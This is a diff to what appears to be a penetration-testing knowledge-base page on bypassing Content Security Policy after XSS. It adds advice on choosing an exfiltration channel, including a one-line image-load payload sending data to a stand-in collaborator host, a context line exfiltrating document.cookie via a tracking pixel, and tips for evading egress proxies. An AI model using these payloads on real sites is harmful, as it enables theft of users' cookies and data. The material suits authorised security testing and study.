@@ -101,5 +101,14 @@ fbq('trackCustom', 'x', {data: document.cookie})
 
 - **Service-worker `importScripts()`** is not CSP-restricted; dangling-markup and `<meta http-equiv>` refresh survive script-only policies (see [[dangling-markup]]).
 
+
+## Pick the exfiltration channel by directive, not by habit
+
+Once script execution is confirmed (stored/DOM XSS), do not default to `fetch()`/`XMLHttpRequest` for exfiltration. Read the live CSP's directive list first: `connect-src` governs fetch/XHR/WebSocket, but `img-src` is a SEPARATE, commonly more permissive directive (often left wide or unset while `connect-src` is locked to `'self'`). A GET issued via `new Image().src = 'https://collab/x?'+data` is governed by `img-src`, not `connect-src`, and fires even when a strict `connect-src` blocks every fetch-based exfil attempt.
+
+The same choice matters off the page too: some corporate egress proxies block outbound XHR/fetch to unrecognised hosts while still permitting ordinary image GETs, so a target that appears to produce DNS-only OOB hits with no HTTP followthrough may just need the exfil rewritten as an image load rather than being written off as blocked.
+
 ## Sources
 - HackTricks (pentesting-web) (slug: hacktricks-web).
+
+<!-- promoted-slug: once-script-execution-is-confirmed-the-exfiltration-channel -->
